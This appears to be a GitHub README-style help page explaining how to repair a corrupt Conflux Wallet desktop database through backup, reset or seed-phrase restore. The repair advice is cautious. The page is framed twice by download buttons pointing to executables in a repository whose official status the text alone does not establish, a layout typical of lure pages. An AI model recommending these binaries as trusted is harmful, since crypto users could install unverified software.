![Conflux Wallet](assets/banner-article.png)

# Repair a Corrupt Wallet Database

<p align="center">Repair a Corrupt Wallet Database: the checks, in order, for the current desktop release.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-30A0D0?style=for-the-badge&labelColor=101010" alt="License: MIT"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

> Only download from this GitHub release page.

**Short answer.** A corrupt local database is a display problem, not a loss: your accounts live in an encrypted key store and can be rebuilt from the recovery phrase, while the database holds history, labels and settings. Copy the data folder first, then restore or reset. Never clear data before making that copy.

## What corruption looks like

The app opens but shows nonsense: balances that flicker, a history with gaps, addresses that fail to load, or an error naming the database on startup. Sometimes it opens once and then refuses, which is the signature of a file half-written by a crash or a full disk.

None of these symptoms say anything about your funds. They say the app's local record is inconsistent, and the app is the only thing that reads that record.

## Why the funds are not in the database

The keys are stored encrypted with your password, and the same keys are derivable from your recovery phrase. A database is a cache of what the chain already knows; the chain is the authority, and it does not need your copy of it. The encrypted store and the database are separate files for exactly this reason: one holds the keys, the other holds a copy of what the chain already knows.

This is worth internalising before you touch anything, because it changes the risk of every step. Deleting data cannot destroy CFX; it can only destroy convenience - labels, saved addresses, the local history view.

## Copy before you touch anything

Before any repair, copy the app's data folder somewhere safe. On every platform this is a plain folder copy, and it is the difference between a reversible experiment and an unrecoverable afternoon.

If you cannot identify the folder with confidence, stop and ask at the published support address rather than guessing. Guessing at file paths is how people delete the wrong directory - and the recovery phrase does not restore anything outside the app's own data.

## Restoring from the phrase

The clean repair is a restore: install the current release, let it create fresh data, and restore the wallet from the recovery phrase. The accounts come back at their addresses, and the database is rebuilt from the chain as it syncs.

https://github.com/conflux-developments/recovery-playbook/blob/HEAD/restore-conflux-wallet-from-seed-phrase.md is the procedure, including the space and account-index checks that decide whether the restore landed where you expected. Do the restore before deleting the old data, so you can compare.

## Resetting the app

A reset clears the app's local state and re-reads it from the network. It is the lighter option when the corruption is in a cache rather than the key store, and it is what the app's own reset control does.

Reset is worth trying before a full restore because it keeps your data where it survives - but only after the copy. A reset that goes wrong is only recoverable if you still have both the copy and the phrase.

## Reset is not an account reset

Two different resets exist and they are easy to confuse. Resetting the app clears local data; resetting an *account* clears the wallet's nonce and history record for a chain. Neither cancels a transaction, and neither changes your keys. Nor does either affect a hardware account, which lives on the device rather than in the app's data.

If your goal is to clear a stuck transaction, neither is the right tool - https://github.com/conflux-developments/recovery-playbook/blob/HEAD/conflux-wallet-stuck-on-connecting.md covers what to do about a stuck app, and a pending transaction is a network question rather than a database one.

## After the restore

Check the address before you check the balance, and check the space before you check the address. A restore that lands on the right address with a zero balance is a sync problem; one that lands on the wrong address is an index problem.

https://github.com/conflux-developments/recovery-playbook/blob/HEAD/conflux-wallet-balance-shows-zero.md is the check if the address is right and the number is not. Then re-add what the database held: labels, saved recipients, any custom tokens. That is the part the phrase cannot restore, and it is why the copy was worth making even when you never need it.

## When it keeps happening

Repeated corruption has causes worth fixing rather than repairing: a disk that is failing, a machine that loses power uncleanly, or an app that is being closed mid-write. The symptom returns after each repair until the cause does not.

Updating is part of the answer - write paths and recovery handling change between builds - and the current release from the release page (https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14) is the baseline. If corruption survives a current build on healthy hardware, report it at the published address with the copy attached, not with your phrase. https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-wallet-network-error.md is the mirror image of this problem - symptoms that clear on their own are transport, not storage.

## Asking for help safely

Send the symptom, the version shown in the app, and the operating system. Never send the recovery phrase, the password, a private key or the key store file itself, and treat any request for them as an attack regardless of the channel.

The product states it never messages first offering help, which removes an entire category of approach. https://github.com/conflux-developments/setup-handbook/blob/HEAD/back-up-conflux-wallet-recovery-phrase.md is the page to read before you need it. The project is actively maintained, so the build to compare against is whatever the release page lists today.

## FAQ

### Is my wallet corrupted or are my funds gone?

Corruption is local: balances and history in the app are a cache of the chain. Your funds are on-chain and the phrase rebuilds the accounts.

### How do I reset Conflux Wallet?

Copy the data folder, then use the app's reset control or restore from the recovery phrase. A reset clears local data; it does not touch the chain.

### Will deleting the database lose my CFX?

No. It loses labels, saved addresses and local history. The accounts come back from the recovery phrase.

### Why does it keep corrupting?

Usually the disk, unclean shutdowns or closing the app mid-write. A failing drive will reproduce the symptom after every repair.

### Can I send you my wallet file to fix it?

No. Send symptoms and the app's version only. A key store file is a secret, and no legitimate support asks for one.

---

## Get Conflux Wallet

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

## Related guides

- [Stuck on Connecting](https://github.com/conflux-developments/recovery-playbook/blob/HEAD/conflux-wallet-stuck-on-connecting.md)
- [Conflux Wallet Network Error](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/conflux-wallet-network-error.md)

[All Conflux Wallet guides](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
